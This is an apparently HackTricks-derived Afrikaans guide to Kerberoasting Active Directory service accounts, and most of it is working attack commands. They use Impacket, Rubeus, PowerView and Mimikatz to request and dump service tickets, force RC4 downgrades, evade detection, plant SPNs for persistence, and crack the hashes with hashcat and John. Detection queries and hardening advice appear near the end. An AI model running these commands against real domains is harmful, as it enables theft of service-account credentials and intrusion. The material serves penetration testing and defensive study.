# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van TGS-kaarte, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) werk, met uitsluiting van rekeninge van rekenaars. Die kodering van hierdie kaarte gebruik sleutels wat afkomstig is van gebruikerswagwoorde, wat offline geloofsbriewe kraken moontlik maak. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë ServicePrincipalName (SPN) eienskap.

Enige geverifieerde domein gebruiker kan TGS-kaarte aan vra, so geen spesiale voorregte is nodig nie.

### Sleutelpunte

- Teikens TGS-kaarte vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met SPN ingestel; nie rekenaarrekeninge nie).
- Kaarte is gekodeer met 'n sleutel wat afgelei is van die diensrekening se wagwoord en kan offline gekraak word.
- Geen verhoogde voorregte vereis nie; enige geverifieerde rekening kan TGS-kaarte aan vra.

> [!WARNING]
> Meeste openbare gereedskap verkies om RC4-HMAC (etype 23) dienskaarte aan te vra omdat hulle vinniger gekraak kan word as AES. RC4 TGS-hashes begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*`, en AES256 met `$krb5tgs$18$*`. egter, baie omgewings beweeg na slegs AES. Moet nie aanvaar dat slegs RC4 relevant is nie.
> Vermy ook "spray-and-pray" roasting. Rubeus se standaard kerberoast kan alle SPNs opvra en kaarte aan vra en is luidrugtig. Enumereer en teiken eers interessante principals.

### Aanval

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Multi-funksie gereedskap insluitend kerberoast kontroles:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumereer kerberoastable gebruikers
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tegniek 1: Vra vir TGS en dump uit geheue
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tegniek 2: Outomatiese gereedskap
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> 'n TGS-versoek genereer Windows-sekuriteitsgebeurtenis 4769 (Daar is 'n Kerberos-dienskaartjie aangevra).

### OPSEC en AES-slegs omgewings

- Versoek RC4 op doel vir rekeninge sonder AES:
- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te lys en versoek RC4-dienskaartjies.
- Rubeus: `/tgtdeleg` met kerberoast aktiveer ook RC4 versoeke waar moontlik.
- Rooster AES-slegs rekeninge eerder as om stilweg te misluk:
- Rubeus: `/aes` lys rekeninge met AES geaktiveer en versoek AES-dienskaartjies (etype 17/18).
- As jy reeds 'n TGT het (PTT of van 'n .kirbi), kan jy `/ticket:<blob|path>` met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
- Teiken, beperk en minder geraas:
- Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
- Filtreer vir waarskynlik swak wagwoorde met `/pwdsetbefore:<MM-dd-yyyy>` (ouer wagwoorde) of teiken bevoorregte OU's met `/ou:<DN>`.

Voorbeelde (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kraking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Volharding / Misbruik

As jy 'n rekening beheer of kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Verlaag 'n rekening om RC4 in te skakel vir makliker kraak (vereis skryweprivileges op die teikenobjek):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
U kan nuttige gereedskap vir kerberoast-aanvalle hier vind: https://github.com/nidem/kerberoast

As u hierdie fout van Linux kry: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` is dit as gevolg van plaaslike tydskew. Sinchroniseer met die DC:

- `ntpdate <DC_IP>` (verouderd op sommige distros)
- `rdate -n <DC_IP>`

### Detectie

Kerberoasting kan stil wees. Jag vir Gebeurtenis ID 4769 van DC's en pas filters toe om geraas te verminder:

- Sluit diensnaam `krbtgt` en diensname wat eindig op `$` (rekenaarrekeninge) uit.
- Sluit versoeke van masjienrekeninge (`*$$@*`) uit.
- Slegs suksesvolle versoeke (Foutkode `0x0`).
- Volg versleutelingstipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moet nie net op `0x17` waarsku nie.

Voorbeeld PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Baseline normale SPN gebruik per gasheer/gebruiker; waarsku oor groot uitbarstings van verskillende SPN versoeke van 'n enkele prinsiep.
- Merk ongewone RC4 gebruik in AES-versterkte domeine.

### Mitigering / Versterking

- Gebruik gMSA/dMSA of masjien rekeninge vir dienste. Gemanagte rekeninge het 120+ karakter random wagwoorde en draai outomaties, wat offline kraking onprakties maak.
- Handhaaf AES op diens rekeninge deur `msDS-SupportedEncryptionTypes` op AES-slegs (desimaal 24 / hex 0x18) in te stel en dan die wagwoord te draai sodat AES sleutels afgelei kan word.
- Waar moontlik, deaktiveer RC4 in jou omgewing en monitor vir pogings tot RC4 gebruik. Op DC's kan jy die `DefaultDomainSupportedEncTypes` registriewaarde gebruik om standaarde vir rekeninge sonder `msDS-SupportedEncryptionTypes` in te stel. Toets deeglik.
- Verwyder onnodige SPNs van gebruikersrekeninge.
- Gebruik lang, random diensrekening wagwoorde (25+ karakters) as gemanagte rekeninge nie haalbaar is; verbied algemene wagwoorde en oudit gereeld.

### Kerberoast sonder 'n domein rekening (AS-aangevraagde STs)

In September 2022 het Charlie Clark gewys dat as 'n prinsiep nie vooraf-verifikasie vereis nie, dit moontlik is om 'n dienskaartjie te verkry via 'n vervaardigde KRB_AS_REQ deur die sname in die versoekliggaam te verander, wat effektief 'n dienskaartjie eerder as 'n TGT verkry. Dit weerspieël AS-REP rooster en vereis nie geldige domein geloofsbriewe nie.

Sien besonderhede: Semperis skrywe “Nuwe Aanvalspaaie: AS-aangevraagde STs”.

> [!WARNING]
> Jy moet 'n lys van gebruikers verskaf omdat jy sonder geldige geloofsbriewe nie LDAP met hierdie tegniek kan ondervra nie.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

As jy AS-REP roastable gebruikers te teiken, sien ook:

{{#ref}}
asreproast.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft se leiding om te help om Kerberoasting te verminder: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting dokumentasie: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
